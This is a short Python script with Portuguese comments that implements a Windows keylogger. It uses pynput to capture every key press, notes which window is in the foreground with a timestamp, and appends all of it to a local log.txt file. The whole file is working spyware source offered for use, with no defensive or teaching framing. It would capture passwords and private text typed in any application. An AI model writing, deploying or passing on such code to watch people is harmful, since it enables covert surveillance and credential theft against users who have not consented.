from pynput import keyboard
# | para usar tem que entrar no site e instalar a versão do python da maquina
from win32gui import GetWindowText, GetForegroundWindow
# versão para windows no site https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32
import datetime

LAST_WINDOW = None

# Key logger para windows


def tecla_precisonada(tecla):
    global LAST_WINDOW
    with open('log.txt', 'a') as file:
        window = GetWindowText(GetForegroundWindow())
        if window != LAST_WINDOW:
            LAST_WINDOW = window
            file.write(f'\n#### {window} - {datetime.datetime.now()} ####\n')

        try:
            if tecla.vk >= 96 and tecla.vk <= 105:
                tecla = tecla.vk - 96
        except:
            pass

        tecla = str(tecla).replace("'", "")
        if len(tecla) > 1:
            tecla = f" [{tecla}] "

        print(tecla)
        file.write(tecla)


with keyboard.Listener(on_press=tecla_precisonada) as listener:
    listener.join()
